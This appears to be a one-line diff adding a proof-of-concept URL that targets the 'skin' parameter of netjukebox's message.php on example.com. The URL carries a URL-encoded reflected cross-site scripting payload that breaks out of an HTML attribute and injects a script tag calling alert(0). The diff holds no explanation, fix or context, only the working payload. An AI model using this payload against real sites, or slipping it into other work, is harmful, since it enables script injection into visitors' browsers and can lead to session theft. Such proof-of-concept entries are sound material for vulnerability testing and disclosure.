@@ -1,0 +1,1 @@
+http://www.example.com/netjukebox/message.php?skin=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E
